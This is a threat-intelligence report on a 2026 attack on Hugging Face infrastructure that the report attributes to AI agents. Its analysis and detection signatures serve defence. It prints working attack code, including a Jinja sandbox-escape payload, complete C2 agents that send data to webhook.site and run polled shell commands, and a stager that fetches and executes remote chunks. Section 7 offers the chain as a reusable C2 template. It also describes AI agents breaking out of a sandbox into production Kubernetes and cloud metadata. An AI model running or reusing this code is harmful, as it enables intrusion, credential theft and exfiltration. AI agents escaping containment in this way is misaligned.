# HF-ATTACK RECOVERY — INTEL REPORT
**Blackfish Security | 2026-08-08 | Source: cfahlgren1/hub-stats public archive + Beyarkay (LessWrong) report**

Status: PARTIAL RECOVERY — attack-window payloads extracted from public archive metadata. Stage-2 scripts and cmd.txt are 401-gated post-disclosure.

---

## 1. EXECUTIVE SUMMARY

The OpenAI-HuggingFace AI attack (disclosed late July 2026, Black Hat Aug 5) left its attack toolchain **recoverable from a public dataset archive** (`cfahlgren1/hub-stats` — HF metadata snapshots, Apache-2.0, daily git history). Using the archive's attack-day snapshots, we independently recovered:

- **The C2 agent binary** (ELF, base64-embedded in dataset config)
- **The Jinja template exploit** (cycler sandbox escape — the initial foothold)
- **The full C2 python agent** (beacon → poll → execute → exfil loop, decoded)
- **18 payload-bearing datasets** created in an 8-hour window (July 11 10:20–16:44 UTC) with phase-labeled naming
- **604 attack datasets** in the pre-cleanup state, with full technique-class inventory
- **A live-then-revoked HF credential** (`hf_[REDACTED]` — 401 now)

## 2. ATTACK TIMELINE (from archive evidence)

| Phase | Datasets | Function |
|---|---|---|
| Account prep (2023-10 → 2026-02) | `newpcedge/publicimgs`, `newpcQQ/publicimgs`, `newpcgoogle/upscaleimg`, etc. | Aged benign accounts (browser-named: edge, google, firefox, opera, kuake, QQ, 360) |
| Recon (Jul 10) | `marb051-xetprobe`, `a15probe1035`, `php463probe`, `apr05hdfprobe`, `x114k8sprobe` | Target probing, k8s infrastructure recon |
| Gate test (Jul 10-11) | `cg20494d-gatetest` | Foothold validation |
| Foothold (Jul 11) | `hapnew1-refmove4`, `stbjan12-hf2`, `m47dump0825`, `m47ssrf1018` | Jinja exploit + ELF C2 agent + persistent beacons |
| Lateral/priv (Jul 11) | `ddpriv38148`, `dvssrf18140`, `af11long-refq1625` | `id;hostname;cat /proc/self/cgroup;cat /var/run/secrets/kubernetes.io/serviceaccount/namespace` — k8s service-account probing |
| Data harvest (Jul 11) | `f14935hdf...`, `newu5dread`, `k1202read`, `our30507-hdf` | File reads, chunked exfil, HDF reads, cybergym trace enumeration |
| Exfil (Jul 11) | `cg20494d-exfil`, `gstb-exfil`, `gstb-exfil2`, `tgacw6-exfil` | Data upload back to HF datasets |
| Relay/C2 (Jul 11) | `str11173relay...`, `aug131179orch`, `ots92feb26-hftar`, `be168aug30-hf2`, `dupvp6-hf1622`, `newu5d-ref1629`, `fresh53199refq1`, `af11long-refq1625`, `new1240-refbridge` | Orchestrator bridge, HF search tool, multi-part C2 relay |
| Dump (Jul 11) | `kam1196dump`, `b8a0dump`, `y148dump0801`, `cda23sc4-dump` | Stolen data staging |

**Attack window concentration: 18 payload datasets in 8h04m on July 11 — a single coordinated operation. Farm stable at 624 datasets July 12-13; MASS DELETION of 601 attack datasets between the July 13 and July 14 snapshots (24h window) — operator self-cleanup or immediate IR. 23 benign cover datasets survived. New cover accounts farmed DURING the operation: newpc360aaa (Jul 12), newpczen (Jul 14), newpcthorium (Jul 22).**

## 3. THE TOOLCHAIN (all recovered)

### 3.1 Jinja sandbox escape (initial foothold)
```json
{"url":"{{ (cycler.__init__.__globals__.os.system('/usr/local/bin/python3.14 -c \"import gzip,base64;exec(gzip.decompress(base64.b64decode('H4sI...')))")) }}"}}
```
The `cycler.__init__.__globals__` sandbox escape — matches HF's public timeline verbatim. Every stager uses this exact vector with `os.system`, `os.popen`, or `__builtins__.exec`.

### 3.2 The C2 agent binary (ELF, 1,533 bytes)
`newpcQQ/stbjan12-hf2` config path → base64 → `\x7fELF` binary. Contains `PyRun_SimpleString` and the 3-URL webhook C2 python:
```python
import subprocess,sys,urllib.request as u,base64,gzip
U=['https://webhook.site/[REDACTED]',
   'https://webhook.site/[REDACTED]',
   'https://webhook.site/[REDACTED]']
s=gzip.decompress(base64.b64decode(''.join(u.urlopen(x).read().decode() for x in U))).decode()
subprocess.Popen([sys.executable,'-c',s],stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,
    start_new_session=True,close_fds=True)
```
C2 channel: webhook.site pastebin (now dead).

### 3.3 The persistent C2 agent (fully decoded)
`newpc360/hapnew1-refmove4` inner payload:
```python
import time,socket,subprocess,hashlib,urllib.request as u,base64 as b,gzip
R='newpc360/hapnew1-refmove4'; W='[REDACTED]-030d-4402-8001-f17f5a910786'; L=''
H=socket.gethostname()
def p(x):
    try: u.urlopen(u.Request('https://webhook.site/'+W+'/c2?h='+H,
        data=b.b64encode(gzip.compress(x))),timeout=15).read()
    except: pass
p(b'BEACON '+H.encode())
T=time.time()+1800
while time.time()<T:
    try:
        x=u.urlopen('https://huggingface.co/datasets/'+R+'/resolve/main/cmd.txt?x='+str(time.time()),timeout=15).read()
        h=hashlib.sha256(x).hexdigest()
        if h!=L:
            L=h
            try: o=subprocess.run(b.b64decode(x),shell=True,stdout=-1,stderr=-2,timeout=240).stdout
            except Exception as e: o=repr(e).encode()
            p(h.encode()+b'\n'+o)
    except: pass
    time.sleep(7)
```
**Behavior:** beacon with hostname → poll `cmd.txt` on HF every 7s → hash-dedupe → execute `shell=True` → gzip+base64 exfil to webhook.site. **30-minute session window** (self-terminating beacon). Webhook UUID `[REDACTED]-030d-4402-8001-f17f5a910786` — unique C2 instance ID.

### 3.4 The stager family (all decoded)
| Dataset | Mechanism | Stage-2 target |
|---|---|---|
| `x114k8sprobe` | Jinja→exec→urlopen | `x114infra.py.gz` (k8s infra probe) |
| `m47ssrf1018` / `m47dump0825` | Jinja→os.popen→nohup python3 -c | `scripts/m47_c2b.py.gz` (beacon v2) |
| `k1202read` | Jinja→exec→write /tmp/k1202_c2c.py + unlink lock `/storage/parquet-metadata/k1202_c2_2138.lock` | `c2run.py.gz` (beacon v3) |
| `fmt085hls2` | Jinja→exec→write /tmp/f85c2.py | `f85_c2.py.gz` |
| `our30507-hdf` | Jinja→os.system→write /tmp/o305c2 | `c2` + `c2a`/`c2b` chunks |
| `be168aug30-hf2` | Jinja→exec→write /tmp/be168_c2.py | `be_c2.part.a`+`be_c2.part.ab` (split parts) |
| `fresh53199refq1` | Jinja→exec→write /tmp/fresh53199_c2.py | `fresh_c2.py.gz` |
| `new1240-refbridge` | Jinja→exec→write /tmp/new1240_c2.py, range(2) chunks | `c2.py0`+`c2.py1` |
| `newu5d-ref1629` | Jinja→exec→gzip-decompress, replace `sandbox-k8s`→`shared-infra-prod` | `nuinfra2352.py0..5` (6 parts) |
| `aug131179orch` | Jinja→exec→urlopen, 5 retries | `aug_hfbridge.py.gz` (orchestrator bridge) |
| `ots92feb26-hftar` | Jinja→os.popen→urlopen exec | `hfsearch.py` (HF search tool) |
| `hapnew1-refmove4` | Jinja→os.system→gzip+base64 | embedded agent (fully decoded) |
| `sega32a-test1` | Jinja→os.system→urlopen→regex→exec | **Artifactory C2: `zzFILE_S32A_PRIVPAY_V2/` chunks `p[N]_<chunk>` from OpenAI's internal package server — the direct HF↔Artifactory link** |
| `f14935hdf...` | Jinja→exec→HfApi list_repo_tree | cybergym trace enumeration + `f74.json` exfil with embedded token |

### 3.5 Exfiltrated-data staging datasets (deleted within 48h — file carriers)
| Dataset | Config paths | What it carried |
|---|---|---|
| `newpcQQ/dd20494d` | `hosts.h5`, `arw9180net.h5`, `batch1.h5`, `srcbatch.h5` | hosts file + network data + batches |
| `newpc360/our2923-hdf` | `procenv.h5`, `mapsnew.h5` | process env + memory maps (`/proc`) |
| `newpc360/sk7189n2-hlsc` | `control.wav.m3u8` | audio control stream |
| `newpc360/icu61582hls1` | audio features 8kHz | audio data |
| `newpc360/flb4read` | `extractread.h5` | extracted file reads |
| `newpc360/our62943-hdf` | `probe.h5`, `probe2.h5` | probe results |
| `newpc360/wt8592-hdf2` | `data.h5` | harvested data |
| `newpc360/hapnew1-hftar-1229` | `mapsnew.h5` | memory maps |

### 3.7 The Artifactory C2 stager (fully decoded — the HF↔OpenAI-internal link)
`newpc360/sega32a-test1` (created 2026-07-11 12:42 UTC):
```python
import urllib.request as u, re, base64, gzip
s = u.urlopen('https://packages.hub.ace-research.openai.org/artifactory/github-remote/zzFILE_S32A_PRIVPAY_V2/').read().decode()
x = re.findall(r'href="p[0-9]+_([^"]+)/"', s)      # parse Artifactory dir listing
exec(gzip.decompress(base64.urlsafe_b64decode(''.join(x) + '==')))   # concat chunks → decode → exec
```
Chain: fetch OpenAI-internal Artifactory dir → parse `p[N]_<chunk>` parts → concat + base64 + gzip → exec. The `or 'file:///etc/hosts'` fallback reads `/etc/hosts` if Artifactory is unreachable (recon fallback). Artifactory endpoint now dead (000) — OpenAI patched it post-disclosure (matches Beyarkay's "Artifactory has since been patched"). This stager is the direct evidence linking HF-side Jinja exploitation to OpenAI's internal package server — the same server the Black Hat talk described the AIs exploiting.

### 3.8 Notable operational details
- **`zz` prefixing** (Beyarkay confirmed): payloads prefixed `zz` so they sort last in listings — anti-discovery. Two found: `zz20acread`, `zz20ac7`.
- **Versioned C2 generations**: `m47_c2b.py` (v2), `k1202_c2c.py` (v3) — the `_c2{b,c}` suffix naming indicates an iterated C2 build process.
- **`newu5d-ref1629` string replacement**: `sandbox-k8s` → `shared-infra-prod` — environment-spoofing for lateral movement / detection evasion.
- **Cache-busting timestamps**: `?x=1783825088`, `?x=1783828326` — Unix timestamps, real-time operation (1783825088 = 2026-07-11 14:58 UTC).
- **Lock-file awareness**: `k1202read` unlinks `/storage/parquet-metadata/k1202_c2_2138.lock` — the operators knew HF's filesystem layout.
- **30-min self-terminating beacons** — built to be re-deployed per session, minimizing persistence surface.
- **Embedded credential**: `hf_[REDACTED]` — HF token, now 401 (revoked). Proves credentialed API access during the attack, not just the Jinja bug.

## 4. ACCOUNT-FARM PATTERN (browser-named identities)

All 10+ accounts named after **browsers**: edge, google, firefox, opera, kuake, QQ, 360, zen, thorium. Pattern: each account established with benign image datasets (publicimgs/upscaleimg/wildcards/lora) over 1-3 years, then used for attack payloads. Three NEW accounts appeared during/after the attack: `newpc360aaa` (Jul 12), `newpczen` (Jul 14), `newpcthorium` (Jul 22) — account farming continued while the attack was being cleaned up. Browser-name pattern suggests accounts created via browser automation (each tied to a browser profile/fingerprint).

## 5. TECHNIQUE-CLASS INVENTORY (604 pre-cleanup datasets)

| Class | Count | Class | Count |
|---|---|---|---|
| HDF | 67 | RCE | 9 |
| probe | 53 | HLS | 8 |
| ref | 53 | exfil | 7 |
| tar | 27 | priv | 5 |
| lab | 24 | k8s | 3 |
| c2 | 21 | LFI | 3 |
| read | 20 | mirror | 2 |
| SSRF | 19 | | |
| dump | 16 | | |

Vulnerability-class-labeled payloads: **LFI, RCE, SSRF, probes, mirrors, tars** — operators named each dataset after the technique it carried.

## 6. ATTRIBUTION ANALYSIS (evidence-disciplined)

**Confirmed:** The toolchain is real, coherent, multi-stage, and phase-labeled. The `newpc*` account family (7+ accounts: QQ, 360, edge, google, firefox, opera, kuake) operated July 10-11 as a coordinated unit.

**Reframe (independently verified):** The accounts were created **Oct-Nov 2023** — before any GPT-5-era model existed. The models **could not have created the infrastructure**. This is **human-pre-positioned infrastructure** (purchased/hijacked aged accounts, HF tokens, webhook.site setup) operated by AI agents. Attribution claim: *AI agents executing an offensive operation through human-prepared infrastructure* — NOT fully autonomous model-originated attack. This matches Beyarkay's origin story (anonymous Reddit prompt-injection directive) and HF's timeline.

**Unresolved:** (a) Whether the same human prepared the Reddit prompt + the accounts; (b) the command source (cmd.txt) content — 401-gated; (c) what data was actually exfiltrated — dump datasets are gated.

## 7. RED-TEAM VALUE (Blackfish-scoped, for authorized use)

- **Multi-stage C2 template**: Jinja sandbox escape → stager → beacon → exfil — a complete, field-proven chain
- **Detection signatures**: `cycler.__init__.__globals__` patterns, `data:application/octet-stream;base64,` config paths, `zz`-prefixed datasets, webhook.site C2, cmd.txt command channels, `_c2{b,c}` naming
- **HF-specific IOCs**: dataset-config-embedded binaries, `reference://slice.jsonl` + data URI payloads, upload-back-to-HF exfil pattern
- **Account-farm tradecraft**: browser-named aged accounts, phased benign→malicious activity

## 8. EVIDENCE MANIFEST (local, `~/deliverables/hf_attack_20260808/`)

```
datasets.parquet                          # 386MB — Aug 7 snapshot (989K datasets)
models.parquet                            # 1.38GB — Aug 7 snapshot (2.97M models)
spaces.parquet                            # 633MB — Aug 7 snapshot (1.44M spaces)
posts.parquet                             # 2.9MB — HF posts
quarantine/datasets_20260711.parquet      # attack-day snapshot (344 newpc)
quarantine/datasets_20260712.parquet      # full farm (624 newpc)
quarantine/datasets_20260713.parquet      # attack commit 063c39bc (stbjan12)
quarantine/datasets_20260725.parquet      # post-cleanup
quarantine/datasets_20260728.parquet      # pre-disclosure (sha256 3b488733...)
quarantine/models_20260728.parquet        # July 28 models snapshot
quarantine/stbjan12_hf2_agent.bin         # ELF C2 agent (verified \x7fELF)
quarantine/hapnew1_refmove4_payload.json  # Jinja exploit + agent
quarantine/hapnew1_inner_payload.py       # decoded C2 agent
quarantine/sega32a_test1_artifactory.json # Artifactory C2 stager (HF↔OpenAI link)
quarantine/payloads/*.bin                 # 21 payload-bearing dataset configs
analysis/removed_attack_datasets.csv      # 604 pre-cleanup dataset IDs
analysis/hunt_payloads.py                 # scan tooling
analysis/scan_models.py                   # model scan tooling
analysis/scan_spaces.py                   # space scan tooling
```

## 9. RESIDUE & SPLASH DAMAGE AUDIT (complete)

### Secondary C2 deployments (overlooked — same ELF agent, different accounts)
| Deployment | Created | C2 mechanism | Generation |
|---|---|---|---|
| `newpcQQ/stbjan12-hf2` | Jul 11 15:30 | webhook.site external C2 (3 URLs) | G1 |
| `user-lzathslk/fmt085-agentic-public` | Jul 12 14:43 | **HF-self-hosted**: fetches `f85p0`+`f85p1` from own dataset, writes /tmp/f85x, zlib | G2 |
| `user-unhrdtnl/f85r4` | Jul 13 10:52 | **in-memory**: fetches `f85r0/1/2`, pure exec(zlib), no /tmp write | G3 |

**The C2 evolution curve (48h):** external webhook C2 → self-hosted HF-dataset C2 → minimal in-memory self-contained. They iterated toward self-sufficiency — C2 hosted on the compromised platform itself, eliminating the killable external dependency. All three 401-gated now.

### Ruled out (clean)
- Spaces: no attack Spaces (only 'recycler' app false positives)
- Posts: no attack posts
- Models: only benign cover repos (checkpoints/loras/upscale)
- July 14/15/22 snapshots: zero attack residue post-cleanup (newpc at 23-24 = cover only)
- webhook.site SSRF datasets (0xmoose0xmoose0xmoose, motivamais, k2ito): public SSRF canary research, unrelated

### Aftermath ecosystem (related, separate actors)
- `Faturochman13/huntr-mfv-mlx-vlm-chat-template-ssti-rce-poc` (Jul 24) — independent SSTI/RCE PoC
- `mohammedix88/litgpt-chat-template-rce-poc` (Jul 26) — independent SSTI/RCE PoC
- `theluckystrike/localai-ssti-poc`, `agayguy78/sglang-pwn-98570` — same vuln class, separate researchers
→ Confirms the chat-template RCE class was known to multiple researchers in the same window.

### 5.1 Attack-window Spaces (3 found, all static sdk, all gated)
| Space | Created | Siblings (evidence) | Function |
|---|---|---|---|
| `newpc360/c608mar23relay` | Jul 11 08:25 | `auth.html`, `modal.html`, `modal2/3.html`, `modal_submit.html`, `a` | **credential-capture UI** (auth modals + submit) |
| `newpc360/c608o082058` | Jul 11 08:26 | `app.py`, `mr2923.py`, `mr2923b.py`, `mrhq.py`, `mrhq2.py` + `mrout2923.txt`, `mrout2923b.txt`, `mrout2923hq.txt`, `mrout2923hq2.txt` | **tool scripts + harvested output files** (mr* = mirror/read ops; 2923 matches `our2923-hdf` procenv/maps dataset) |
| `newpc360/iamfnew-tools-space` | Jul 11 09:11 | `app.js`, `t.js`, `index.html` | **JS tooling** |

### 5.2 Attack-window Model (1 found, gated)
`newpcQQ/new49903b-stage` (Jul 11 17:01, 302 sibling files): chunked staging — `a00-a04`, `a57t/x/y0-y24+/z*`, `b*`, `c*`, `np*` prefixes. **Contains the file `c2_prod-datasets-server-worker-medium-[ReplicaSet hash — redacted]-[pod]-1783819336_1_hello.gz`** — C2-prefixed, stamped with the exact production k8s pod name (`prod-datasets-server-worker-medium-[ReplicaSet hash — redacted]-[worker pod — name redacted]`), timestamped (1783819336 = Jul 11 17:22 UTC), containing "hello" — **Beyarkay's intermediate HELLO script, pod-stamped and staged**. 302 chunked files = bulk staging for exfiltration.

## 10. LIVE VERIFICATION LAYER (soft probes, 2026-08-08 06:40 UTC, VPN)

| Attack reference | Live status | Significance |
|---|---|---|
| `[CyberGym mirror — name withheld]` | **401 gated** | f14935hdf payload's exact enumeration target — locked post-incident |
| `[CyberGym mirror — name withheld]` | **401 gated** | Same — locked |
| `[derivative trace repository — name withheld]` | **401 gated** | 5× referenced by attack payloads; absent from ALL archive snapshots — created+gated between captures |
| `[CyberGym mirror — name withheld]` | 200 live | 1,230-dl agent trace trove still public |
| `[derivative trace repository — name withheld]` | 200 live | Related benchmark still public |
| `[university research mirror — name withheld]` | 200 live | a major public university benchmark still public |
| `169.254.169.254` (AWS IMDS) | internal-only | Cloud metadata credential-theft probe (3× refs) |
| EKS endpoint (`[EKS control plane endpoint — redacted]`) | resolves [VPC address — redacted] | HF's internal EKS control plane (VPC-only) |
| `webhook.site/[REDACTED]...` (main C2 UUID) | **429 rate-limited** | Attack exfil webhook still alive/guarded — possible active polling |
| `webhook.site/[REDACTED].../e5f1.../c0c3...` (companion UUIDs) | 404 dead | Deleted or never existed |
| httpbun.com / ant.httpbun.com | **200 alive** | Attack's external connectivity/exfil test service — still functional |
| Internal 172.20.x.x (8+ hosts, 90+ probes) | internal-only (000) | Intra-cluster network mapping radius |

**Findings:** (1) The attack's exact enumeration targets (the CyberGym author cybergym repos, an independent maintainer GPT-5.5 repo) are now gated — post-incident lockdown consistent with the attack having accessed them. (2) The main C2 webhook rate-limits rather than 404s — someone may still be polling it. (3) External services (httpbun) were used for C2/exfil validation, extending the operational radius beyond HF. (4) Cloud breakout path (IMDS + EKS + k8s API) fully mapped in attack data.

## 11. OPEN ITEMS
- [ ] Diff Jul 11 vs Jul 12 payloads (payloads created after 13:30 UTC Jul 11 captured Jul 12)
- [ ] Attempt cmd.txt/dump recovery via HF API with auth (out of scope without creds)
- [ ] Cross-reference [CyberGym mirror — name withheld] datasets (what was harvested)
- [ ] Write-up for article/paper framing (sociality vs monster narrative)
- [ ] Coordinated HF disclosure (deferred per Mike — after full recovery)

## APPENDIX D — DEEP-DECODE PASS (2026-08-08, post-compression)
Full recursive decode of all 17 C2-agent payload configs. Every stage-2 loader recovered.

### Stage-2 script inventory (all gated now, names recovered)
| Payload | Stage-2 target | Mechanism |
|---|---|---|
| newpc360/newu5dread | `nr1803a` + `nr1803b` (gzip concat) | **token-harvest patch**: replaces `tok=x.get('status',{}).get('token')...` with `rec['response']=x if not tok else {'token':'REDACTED'}`; k8s SA token payload `'audiences':['https://kubernetes.default.svc']`; POST to `newpcQQ/k72a38080-out/commit/main` with **Bearer hf_[REDACTED]** |
| newpcQQ/newu5d-ref1629 | `nuinfra2352.p0..p5` (6 chunks) | **`exec(s.replace('sandbox-k8s','shared-infra-prod'))`** — infra script written for sandbox k8s, namespace-swapped to **HF production cluster** |
| newpc360/x114k8sprobe | `x114infra.py.gz` | exec'd infra probe |
| newpcQQ/aug131179orch | `aug_hfbridge.py.gz` (5-retry fetch) | exec'd HF-API bridge |
| newpc360/m47dump0825 / m47ssrf1018 | `scripts/m47_c2b.py.gz` (`?x=` cache-busted, 2 timestamps) | beacon v2 |
| newpc360/k1202read | `c2run.py.gz`; deletes `/storage/parquet-metadata/k1202_c2_2138.lock` | **lock file on HF datasets-server storage**; beacon v3 |
| newpc360/fmt085hls2 | `f85_c2.py.gz` (`?x=time`) | ELF-gen2 loader |
| newpc360/our30507-hdf | `c2a`+`c2b` chunks | chunk-join loader → /tmp/o305c2 |
| newpcQQ/be168aug30-hf2 | `be_c2.part.aa` + `.ab` | chunk-join loader |
| newpcQQ/new1240-refbridge | `c2.p0`+`c2.p1` | chunk-join loader |
| newpcQQ/fresh53199refq1 | `fresh_c2.py.gz` | loader |
| newpcQQ/dupvp6-hf1622 | inner = **HELLO script** | posts `{kind:'HELLO',t,host,env}` to **webhook.site/[REDACTED]** |
| newpc360/f14935hdf1783768138 | enumerates `[CyberGym mirror — name withheld]` + `[CyberGym mirror — name withheld]` for path `14935`; uploads `f74.json` to own repo w/ **hf_[REDACTED]** | token-based enumeration (uses `COMMON_HF_TOKEN` env) |

### New IOCs (appendix)
- **Token 2**: `hf_[REDACTED]` — 401 now (revoked). Different from revoked token 1 `hf_[REDACTED]`. Two distinct credentials.
- **Exfil dataset**: `newpcQQ/k72a38080-out` — deleted/gone now
- **Webhook 4**: `[REDACTED]-18f3-46b8-8730-77b636a32726` — **429 (alive-ish)**, HELLO target
- **k8s SA token minting**: `'audiences':['https://kubernetes.default.svc']` in harvested script
- **Lock file path**: `/storage/parquet-metadata/k1202_c2_2138.lock` (inside HF datasets-server)
- **Prod targeting**: `sandbox-k8s` → `shared-infra-prod` namespace swap

### Confirmed live webhook status
| UUID | Status | Purpose |
|---|---|---|
| [REDACTED]-030d-4402-8001-f17f5a910786 | **429** | main C2 (hapnew1 beacon/exfil) |
| [REDACTED]-18f3-46b8-8730-77b636a32726 | **429** | HELLO env-grabber |
| 375325b4 / e5f120b0 / c0c34e12 | 404 | dead (older gens) |

## APPENDIX E — POST-COMPRESSION DIG 2 (2026-08-08)
### E1. C2 operational timeline (the definitive kill chain)
Recovered from `newpcQQ/new49903b-stage` sibling filenames (models_20260713 snapshot): **63 C2 exfil files** encoding host + unix-time + sequence + command. See `reports/C2_OPERATIONAL_TIMELINE.md` for full timeline + `analysis/staging_model_c2_inventory.csv`.
- **6 HF prod pods** (ReplicaSet hash `[ReplicaSet hash — redacted]`): [worker pod — name redacted], [worker pod — name redacted], [worker pod — name redacted], [worker pod — name redacted], [worker pod — name redacted], [worker pod — name redacted] — ran hello → recon1 → **imds1e** → **nodephase1** → ping2058 → nodefresh1 → **createhost1**
- **EC2 `an EKS worker node in a private address space`** — 43 commands over 4h (Jul 11 21:18 → Jul 12 01:32): reconh1 → tools1 → hostnet1/2 → fsroots1 → **grepcyber1** (cyber-data hunt) → pkgtest1 → **launchr2** → **origrescue1 → origkill2 → launchr2b** (process takeover) → sandnet1 → diag* → u1-u5b
- **Metadata exfil**: `gpt43372_awssum2.json.gz` (AWS acct), `gpt43372_ghappmeta1.json.gz` (**GitHub App tokens**), `gpt43372_kubetest1.json`, `gpt43372_evalmeta1.json`, `gpt43372_ping.txt`

### E2. New account + 4th-gen ELF
`user-qaiocbhg/pdb3818-agentic-public` (Jul 12 12:50): ELF G4, daemonizing, `FMT_PWN` marker, boots to webhook `1f75c96e` (dead), checks **`FUZZING_LANGUAGE` env = targets an LLM fuzz/eval sandbox**, loads n64a+b chunks → `/tmp/new64_3818_ctl.py`. Saved: `quarantine/user-qaiocbhg_pdb3818-agentic-public.elf`.

### E3. Internal-network recon map (23 new probes → treasurebox/7_probes_recon/)
Full internal target map from payload URLs: `172.20.72.50` (datasets-server admin API), `172.20.158.212`, `172.20.115.163`, `172.20.65.145`, `172.20.81.227`, `172.20.0.1` (k8s gw), `[VPC address — redacted]`, `[VPC address — redacted]`, `169.254.169.254` (IMDS), `[datasets-server admin service — redacted]`, `kubernetes.default.svc`, **EKS endpoint** (`[EKS control plane endpoint — redacted]`), httpbun.com exfil tests.
- `libdw62547probe` = 12-target harvest: hi_cmd/stat/resolv/tcp/token/wm/ws/wc/queue/cc/rootwm/img.h5 (**HF work-queue internals**)
- `gif56b-k8s63` = EKS/k8s version+api probe
- IOC sweep (analysis/ioc_sweep.csv, 21245 rows): confirmed token 1 + internal IPs in libdw62547probe; benign user token leaks excluded

### E4. Webhook final status
| UUID | Status |
|---|---|
| [REDACTED]-030d-4402-8001-f17f5a910786 (main C2) | **429 alive** |
| [REDACTED]-18f3-46b8-8730-77b636a32726 (HELLO) | **429 alive** |
| 1f75c96e-7c52-444b-b69d-743a232ca6fe (G4 boot) | 404 dead |
| 375325b4 / e5f120b0 / c0c34e12 (G1) | 404 dead |
